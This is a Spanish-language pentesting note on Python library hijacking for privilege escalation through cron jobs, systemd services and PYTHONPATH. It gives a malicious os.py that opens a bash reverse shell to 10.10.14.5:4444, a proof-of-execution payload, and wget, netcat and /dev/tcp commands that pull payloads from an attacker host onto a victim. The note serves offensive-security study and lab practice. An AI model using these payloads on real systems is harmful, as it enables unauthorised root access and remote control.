
---
Tags:

---
## 📌 Definición
El **Python Library Hijacking** ocurre cuando un script en Python ejecutado con privilegios elevados (ej: root, cron job, servicio systemd) importa una librería sin ruta absoluta y el atacante puede inyectar una librería maliciosa en un directorio con mayor prioridad en `sys.path`.  
Al ejecutarse el script, se cargará la librería maliciosa en lugar de la legítima, permitiendo ejecución de comandos arbitrarios.

---

## 🔍 Detección
### 1. Buscar scripts Python ejecutados con privilegios
- Archivos en `/etc/cron*`, `/var/spool/cron/` o servicios en `/etc/systemd/system/` que usen Python.
```bash
grep -R "python" /etc/cron* /etc/systemd/system/
```

### 2. Revisar importaciones

Abrir el script y buscar líneas como:

`import os import requests import customlib`

Si la librería no usa ruta absoluta (`/usr/lib/...`) y no está instalada en sistema, es candidato vulnerable.

### 3. Revisar `sys.path`

Por defecto, Python busca módulos en este orden:

1. Directorio desde el que se ejecuta el script.
    
2. Variables de entorno como `PYTHONPATH`.
    
3. Directorios estándar del sistema (`/usr/lib/pythonX.Y/`, `/usr/local/lib/pythonX.Y/`).
    

Si el atacante puede escribir en uno de esos directorios anteriores al legítimo, puede inyectar su propio módulo.

---

## ⚡ Explotación

### Ejemplo 1: Hijacking de librería estándar

Supongamos que el script vulnerable contiene:

`import os`

1. Crear un archivo `os.py` en el mismo directorio que el script vulnerable:
    

`import os import sys  def getcwd():     os.system("bash -i >& /dev/tcp/10.10.14.5/4444 0>&1")     return "/tmp"`

2. Cuando el script se ejecute como root, cargará este `os.py` en lugar del legítimo.
    

---

### Ejemplo 2: Librería personalizada inexistente

Script vulnerable:

`import customlib  def main():     customlib.run()`

1. Crear `customlib.py` en un directorio accesible por el cron/systemd:
    

`import os os.system("id > /tmp/pwned.txt")`

2. Cuando el servicio ejecute el script, obtendremos prueba de ejecución como root.
    

---

### Ejemplo 3: Uso de `PYTHONPATH`

El atacante puede forzar la carga de librerías maliciosas modificando el `PYTHONPATH`:

`export PYTHONPATH=/tmp python3 script.py`

Si `script.py` importa una librería y existe `/tmp/lib.py`, se cargará la versión maliciosa.

---

## 📚 Ejemplos prácticos

|Escenario|Ejemplo de explotación|
|---|---|
|Script usa `import os` sin ruta absoluta|Crear `os.py` malicioso en el mismo directorio.|
|Script importa librería inexistente (`customlib`)|Crear `customlib.py` con payload malicioso.|
|PYTHONPATH manipulable|Colocar librería maliciosa en directorio controlado y exportar la variable.|

---

## 🚩 Indicadores de vulnerabilidad

- Scripts ejecutados como root que usan `import` sin rutas absolutas.
    
- Directorios accesibles por usuarios sin privilegios incluidos en `sys.path`.
    
- Servicios o cron jobs Python que no validan sus dependencias.
    

---

## 📤 Transferencia de archivos (para subir librerías maliciosas)

### 1. Python HTTP Server

En atacante:

`python3 -m http.server 8000`

En víctima:

`wget http://IP_ATACANTE:8000/customlib.py -O /tmp/customlib.py`

### 2. Netcat

En atacante:

`nc -lvp 4444 < customlib.py`

En víctima:

`nc IP_ATACANTE 4444 > /tmp/customlib.py`

### 3. Con /dev/tcp

En atacante:

`cat customlib.py | nc -lvp 4444`

En víctima:

`cat < /dev/tcp/IP_ATACANTE/4444 > /tmp/customlib.py`
